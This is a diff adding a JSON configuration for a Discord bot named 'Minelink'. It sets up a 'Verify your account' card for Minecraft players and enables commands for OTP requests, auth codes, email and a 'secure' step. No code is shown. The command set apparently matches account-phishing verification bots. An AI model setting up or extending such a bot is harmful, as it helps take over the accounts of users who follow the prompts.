@@ -1,0 +1,74 @@
+{
+    "_comment": "Non-secret bot settings. `enabled_commands` may also be a plain true/false to turn every cog on/off. Command names live in `aliases`; command enable flags live in `real`. The Minelink Components V2 look is configured in `embeds.components_v2` \u2014 every key is optional and defaults to the current card design.",
+    "enabled_commands": {
+        "real": {
+            "auth_code": true,
+            "check_lock": true,
+            "email": true,
+            "refresh_posts": true,
+            "request_otp": true,
+            "secure": true,
+            "send_embed": true,
+            "set_channel": true,
+            "stats": true
+        },
+        "fake": {},
+        "aliases": {
+            "auth_code": "auth_code",
+            "check_lock": "check",
+            "email": "email",
+            "request_otp": "request_otp",
+            "secure": "secure",
+            "send_embed": "send",
+            "set_channel": "set",
+            "stats": "mcstats"
+        }
+    },
+    "embeds": {
+        "verification": {
+            "default": {
+                "title": "Verify your account",
+                "description": "Link your Minecraft account to get access to the server.\n\nClick **Verify** below and finish the steps \u2014 it usually takes under a minute.",
+                "color": 3066993,
+                "thumbnail": "",
+                "footer": {
+                    "text": ""
+                },
+                "fields": []
+            }
+        },
+        "verify_card": {
+            "title": "Verify your account",
+            "description": "Link your Minecraft account to get access to the server.\n\nClick **Verify** below \u2014 it usually takes under a minute.",
+            "thumbnail": "attachment://minelink.png"
+        },
+        "components_v2": {
+            "_comment": "Minelink-style Components V2 cards. Colours accept '#52A435', '0x52A435' or a decimal int. Set a button's emoji to \"\" to remove it. Thumbnails accept a URL, or 'attachment://minelink.png' for local files in assets/ (the /send embed command attaches them).",
+            "colors": {
+                "success": "#52A435",
+                "error": "#ED4245",
+                "warning": "#FEE75C",
+                "info": "#5865F2"
+            },
+            "footer": "-# Minecraft Verification",
+            "heading_emoji": "\ud83d\udd37",
+            "verify_button": {
+                "label": "Verify",
+                "emoji": "\u2705",
+                "style": "success"
+            }
+        }
+    },
+    "presence": {
+        "status": "online",
+        "activity_text": "Minecraft with friends",
+        "activity_type": "playing"
+    },
+    "post_verification": {
+        "actions": []
+    },
+    "refresh_posts": {
+        "interval_hours": 30,
+        "posts": []
+    }
+}
